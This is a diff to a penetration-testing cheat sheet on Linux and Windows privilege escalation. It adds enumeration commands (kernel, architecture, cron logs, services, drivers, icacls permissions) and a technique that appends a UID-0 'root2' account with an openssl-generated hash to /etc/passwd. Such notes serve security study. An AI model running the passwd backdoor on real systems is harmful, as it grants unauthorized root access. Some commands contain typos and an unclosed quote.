@@ -134,13 +134,19 @@
     ```
   - System Information
     ```bash
+    # System identification
     cat /etc/issue
     ```
     ```bash
     cat /etc/*-release
     ```
     ```bash
+    # Kernel Version
     uname -a
+    ```
+    ```bash
+    # Architecture
+    arch
     ```
   - Running Processes and Services
     ```bash
@@ -177,6 +183,9 @@
   - Scheduled Tasks
     - Scheduled tasks are listed under the **/etc/cron.* directories.
     - Sometimes administrators add their scheduled tasks in the **/etc/crotab** file.
+    ```bash
+    grep "CRON" /var/log/cron.log
+    ```
 
    - Installed Applications and Patch Levels
     ```bash
@@ -215,7 +224,14 @@
     ```bash
     find / -perm -u=s -type f 2>/dev/null
     ```
+  - Write in /etc/passwd
+    - If a password has is peresnt at the second column of `/etc/passwd`, it is considered valid for authentication. It means that if we have permission to write into the file, we can set the password for any user. Also we can modify de UID and GUID (zero for root).
+    ```bash
+    xonork@xonork ~ openssl passwd test
+    a96sb9Hrowj0c
     
+    xonork@xonork ~  echo "root2:a96sb9Hrowj0c:0:0:root:/root:/bin/bash" >> /etc/passwd
+    ```
 - **Automated**
   - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
   - [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
@@ -250,6 +266,10 @@
     ```bash
     tasklist /SVC
     ```
+    ```bash
+    Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
+    ```
+    
   - Network information
     ```bash
     ipconfig /all
@@ -292,8 +312,12 @@
     ```
   - Device Drivers and Kernel Modules
     ```bash
-    #In powershell
+    #In cmd
     driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
+    ```
+    ```bash
+    #In cmd
+    driverquery /v
     ```
     ```bash
     #In powershell
@@ -306,6 +330,18 @@
     ```bash
     reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
     ```
+  - File Security Identifiers (SIDs)
+    | Mask | Permissions |
+    |------|-------------|
+    | F | Full access |
+    | M | Modify access |
+    | RX | Read and execute access |
+    | W | Write-only access |
+    
+    - Enumerate file SIDs
+      ```bash
+      icacls "C:\Program Files\Test\bin\binary.exe
+      ```
     
 - **Automated**
   - [PowerSploit's Power Up](https://github.com/PowerShellMafia/PowerSploit)
